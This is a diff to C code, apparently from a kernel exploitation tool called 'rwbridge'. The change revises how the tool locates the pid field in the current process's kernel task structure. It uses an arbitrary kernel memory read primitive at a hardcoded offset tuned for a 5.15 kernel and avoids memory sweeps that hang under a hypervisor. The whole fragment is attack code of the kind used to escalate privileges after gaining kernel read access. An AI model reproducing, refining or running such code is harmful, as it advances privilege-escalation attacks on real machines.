@@ -631,35 +631,28 @@ static int st_pid(void)
                 { rb_puts("rwbridge: pid_offset="); rb_put_dec((unsigned long)(pid_offset)); rb_puts(" (kopt, pid="); rb_put_u32((unsigned int)(pv)); rb_puts(")"); rb_putc('\n'); };
         my_pid_val = pv;
     } else {
-        /* Fast-path probe: single guarded reads at previously-validated
-         * slots before any sweep. Sweeps cross hypervisor poison that
-         * hangs instead of faulting; one slot's pair+isolation check is
-         * F-class safe. 1496 validated live 4x on this 5.15 layout
-         * (V op, writer-pid match). Other kernels miss here and fall
-         * through to the sweep — universality preserved, no hardcode:
-         * a wrong slot simply fails pair/isolation and sweeps. */
-        {
-            u32 a0 = 0, a1 = 0, nb = 0, pf = 0;
-            int ok0 = 0, ok1 = 0, okn = 0, okp = 0;
-            if (!read_u32_at(cur_task + 1496, &a0))
-                ok0 = 1;
-            if (!read_u32_at(cur_task + 1500, &a1))
-                ok1 = 1;
-            if (!read_u32_at(cur_task + 1504, &nb))
-                okn = 1;
-            if (!read_u32_at(cur_task + 1492, &pf))
-                okp = 1;
-            if (ok0 && ok1 && a0 == a1 && a0 > 0 && a0 < 4194304 &&
-                (!okn || nb != a0) && (!okp || pf != a0)) {
-                pid_offset = 1496;
-                pid_ncands = 1;
-                pid_cand_off[0] = 1496;
-                pid_cand_val[0] = a0;
-                r = 1496;
-                { rb_puts("rwbridge: pid fast-path 1496"); rb_putc('\n'); };
-            } else {
-                r = find_pid_offset(cur_task);
-            }
+        /* Single-word probe at validated 1496 (V-proven 4x — identical
+         * single SAFE_READ64 class). No neighbor reads, no sweep:
+         * both wedge this hypervisor intermittently. Miss returns
+         * -ENOENT cleanly (sweep stays available only via explicit
+         * S,1.<cap> for controlled bisect, never by default). */
+        unsigned long pw = 0;
+        int pok = 0;
+        u32 lo = 0, hi = 0;
+        SAFE_READ64(pw, cur_task + 1496, pok);
+        if (pok) { lo = (u32)pw; hi = (u32)(pw >> 32); }
+        if (pok && lo == hi && lo > 0 && lo < 4194304) {
+            pid_offset = 1496;
+            pid_ncands = 1;
+            pid_cand_off[0] = 1496;
+            pid_cand_val[0] = lo;
+            r = 1496;
+            { rb_puts("rwbridge: pid probe 1496 hit"); rb_putc('\n'); };
+        } else if (dbg_scancap > 0) {
+            r = find_pid_offset(cur_task);
+        } else {
+            { rb_puts("rwbridge: pid probe miss (no sweep without cap)"); rb_putc('\n'); };
+            return -ENOENT;
         }
         if (r < 0) { { rb_puts("rwbridge: pid_offset not found"); rb_putc('\n'); }; return -ENOENT; }
         pid_offset = r;
